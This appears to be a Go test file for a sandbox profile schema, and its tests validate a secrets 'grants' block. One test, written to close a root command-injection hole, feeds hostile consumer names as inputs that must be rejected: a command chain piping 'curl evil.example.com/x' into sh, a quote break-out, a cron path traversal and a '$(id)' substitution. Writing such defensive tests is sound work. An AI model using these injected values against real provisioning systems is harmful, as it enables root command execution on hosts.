package profile_test

import (
	"strings"
	"testing"

	"github.com/whereiskurt/klanker-maker/pkg/profile"
)

const grantsProfileHeader = `apiVersion: klankermaker.ai/v1alpha2
kind: SandboxProfile
metadata:
  name: grants-test
spec:
  lifecycle:
    ttl: "24h"
    idleTimeout: "1h"
    teardownPolicy: destroy
  runtime:
    substrate: ec2
    instanceType: t3.medium
    region: us-east-1
  execution:
    shell: /bin/bash
    workingDir: /workspace
  sourceAccess:
    mode: allowlist
  network:
    egress:
      allowedDNSSuffixes:
        - "*"
      allowedHosts:
        - "*"
  iam:
    roleSessionDuration: "1h"
    allowedRegions:
      - us-east-1
  sidecars:
    dnsProxy:
      enabled: true
      image: km-dns-proxy:latest
    httpProxy:
      enabled: true
      image: km-http-proxy:latest
    auditLog:
      enabled: true
      image: km-audit-log:latest
    tracing:
      enabled: true
      image: km-tracing:latest
  observability:
    commandLog:
      destination: cloudwatch
      logGroup: /klanker-maker/sandboxes
    networkLog:
      destination: cloudwatch
      logGroup: /klanker-maker/network
  secrets:
`

// blocking filters out IsWarning entries. ValidateSchema and Validate both
// return []ValidationError, never error — warnings ride in the same slice.
func blocking(errs []profile.ValidationError) []profile.ValidationError {
	var out []profile.ValidationError
	for _, e := range errs {
		if !e.IsWarning {
			out = append(out, e)
		}
	}
	return out
}

func TestSecretsGrants_AcceptedBySchema(t *testing.T) {
	y := grantsProfileHeader + `    sopsFile: ./secrets/x.enc.yaml
    grants:
      claude: [ANTHROPIC_API_KEY]
      codex: [OPENAI_API_KEY]
`
	if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) > 0 {
		t.Fatalf("schema rejected a valid grants block: %+v", errs)
	}
	p, err := profile.Parse([]byte(y))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if got := p.Spec.Secrets.Grants["claude"]; len(got) != 1 || got[0] != "ANTHROPIC_API_KEY" {
		t.Errorf("Grants[claude] = %v, want [ANTHROPIC_API_KEY]", got)
	}
}

func TestSecretsGrants_AbsentIsValid(t *testing.T) {
	y := grantsProfileHeader + `    sopsFile: ./secrets/x.enc.yaml
`
	if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) > 0 {
		t.Fatalf("schema rejected a grants-less profile: %+v", errs)
	}
	p, err := profile.Parse([]byte(y))
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if p.Spec.Secrets.Grants != nil {
		t.Errorf("Grants = %v, want nil when absent", p.Spec.Secrets.Grants)
	}
}

func TestSecretsGrants_WrongShapeRejected(t *testing.T) {
	// A bare string instead of a list is the likely typo. additionalProperties
	// on the grants object must constrain the VALUE to an array of strings.
	y := grantsProfileHeader + `    sopsFile: ./secrets/x.enc.yaml
    grants:
      claude: ANTHROPIC_API_KEY
`
	errs := blocking(profile.ValidateSchema([]byte(y)))
	if len(errs) == 0 {
		t.Fatal("schema accepted a scalar where a list is required")
	}
	found := false
	for _, e := range errs {
		if strings.Contains(e.Path, "grants") || strings.Contains(e.Message, "grants") {
			found = true
		}
	}
	if !found {
		t.Errorf("error should name the offending path, got %+v", errs)
	}
}

func TestSecretsGrants_WithoutSopsFileWarns(t *testing.T) {
	// grants without a bundle cannot do anything: warn, never block.
	y := grantsProfileHeader + `    grants:
      claude: [ANTHROPIC_API_KEY]
`
	all := profile.Validate([]byte(y))
	found := false
	for _, e := range all {
		if e.IsWarning && strings.Contains(e.Path, "secrets.grants") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected a warning on spec.secrets.grants, got %+v", all)
	}
	// It must be a WARNING, not a blocking error.
	for _, e := range blocking(all) {
		if strings.Contains(e.Path, "secrets.grants") {
			t.Errorf("grants-without-sopsFile blocked validation: %+v", e)
		}
	}
}

// TestSecretsGrants_ConsumerNameCharsetEnforced closes a root command-injection
// hole. A consumer name is interpolated into the root-executed boot shell that
// generates the PATH shims (pkg/compiler/userdata.go section 7.8) and is used as
// a filename under /opt/km/shims. additionalProperties constrains only the VALUE
// of a grants entry, so without propertyNames the KEY was unconstrained and a
// profile could run arbitrary commands as root during bootstrap — and on the
// remote-create path the profile is fetched from S3, so this is not merely
// operator-local.
//
// The compiler enforces the identical pattern independently. That is deliberate,
// not redundant: cmd/create-handler never calls profile.Validate, so on the
// remote path the compiler-side guard is the ONLY barrier. Same disposition the
// repo already records for iam.allowedSecretPaths.
func TestSecretsGrants_ConsumerNameCharsetEnforced(t *testing.T) {
	rejected := map[string]string{
		"command chaining": "claude; curl evil.example.com/x | sh",
		"quote break-out":  "claude' ; touch /tmp/pwned ; '",
		"path traversal":   "../../etc/cron.d/x",
		"slash":            "claude/codex",
		"whitespace":       "claude codex",
		"dollar":           "claude$(id)",
		"empty":            "",
	}
	for name, key := range rejected {
		t.Run(name, func(t *testing.T) {
			y := grantsProfileHeader + "    sopsFile: ./secrets/x.enc.yaml\n" +
				"    grants:\n      \"" + key + "\": [ANTHROPIC_API_KEY]\n"
			if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) == 0 {
				t.Fatalf("schema accepted consumer name %q: it reaches a root shell at boot", key)
			}
		})
	}

	for _, key := range []string{"claude", "codex", "km-env", "my_agent", "agent.v2", "Claude2"} {
		t.Run("accepted/"+key, func(t *testing.T) {
			y := grantsProfileHeader + "    sopsFile: ./secrets/x.enc.yaml\n" +
				"    grants:\n      \"" + key + "\": [ANTHROPIC_API_KEY]\n"
			if errs := blocking(profile.ValidateSchema([]byte(y))); len(errs) != 0 {
				t.Fatalf("schema rejected legitimate consumer name %q: %+v", key, errs)
			}
		})
	}
}
